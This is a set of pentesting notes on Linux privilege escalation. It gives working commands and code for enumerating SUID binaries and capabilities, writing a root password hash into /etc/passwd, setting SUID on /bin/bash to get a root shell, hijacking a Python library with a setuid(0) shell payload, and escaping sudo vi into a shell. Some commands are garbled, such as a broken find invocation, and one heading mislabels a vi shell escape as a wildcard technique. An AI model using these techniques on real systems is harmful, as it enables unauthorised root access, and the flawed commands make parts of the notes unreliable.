# (PART) Priviledge Escalation {-}

# Linux Machine {-}


To check in which group the user is in the machine:

```bash
id 
```

To look at the user priviledges use:

```bash
sudo -l
```

Next enumerate SSUID priviledges at system level:

```bash
cd /
find \-perm -4000 2>/dev/null
```

## Writable rights in /etc/passwd {-}

Find the tools where the non privileged user have writable rights

```bash
cd /
find \-writable -4000 2>/dev/null | grep "etc"
```

Imagine that /etc/passwd is in the list, that means that u can add a password to root where the first **x** is.

Create a DES(Unix) password

```bash
openssl passwd
#Output
Password:
Verifying - Password:

JIJQueSBU9kBY
```

You can then copy the hash in passwd for the root user

```bash
root:JIJQueSBU9kBY:0:0:root:/root:/usr/bin/zsh
```

## Local Port forwarding {-}

```bash
ssh -i id_rsa user@<ip> -L 9000:172.17.0.2:9000
```

- -i for adding ssh id_rsa key
- -L for local port forwarding where 9000 correspond to local attacker port and 172.17.0.2:9000 correspond to the address Attacker want to connect using ssh

## Add SSUID priviledge to tool {-}

```bash
ls -l /bin/bash
# output
-rwxr-xr-x  1   root    root    1037528 May 16  2017    bash

#add ssuid rules
chmod u+s /bin/bash
ls -l /bin/bash
#output
-rwsr-xr-x  1   root    root    1037528 May 16  2017    bash

bash -p
# output
bash-4.3# whoami
root
```

## Path Hijacking {-}

**Path Hijacking** take profit of programms that are ssuid and use a command that have a relative path. You can then update the Path variable environment
and point to a malicious software that will be executed as root

## Library Hijacking {-}

**Library Hijacking** follows exactly the same logic as **Path Hijacking** but with programming languages. If we take the example of python.

```python
import sys

print(sys.path)
#Output
['', '/usr/lib/python2.7', ...]
```

As you can see, when we use the keyword import in python, the first place python will check for importing a library is in the current working directory.
That means that taking the same dumby example if you create a malicious file and rename it by sys.py

```python
import os

os.setuid(0)
os.system("/bin/bash")
```

That's it... by calling the previous script you will become root.

## WildCards {-}

```bash
sudo -l

#output
User x may run the following commands on y:
    (user2) NOPASSWD: /usr/bin/vi


sudo -u user2 /usr/bin/vi
# in vim you can now set commands as user2

:set shell=/bin/bash
:shell

whoami
#output
user2
```

## Linux capabilities exploitation {-}

Check in the system if a tool have a special capability that can be used in order to escalate priviledges (**cap_setuid+ep**)

```bash
getcap -r / 2>/dev/null
```

## Kernel abuse {-}

first check the kernel version

```bash
uname -a
```
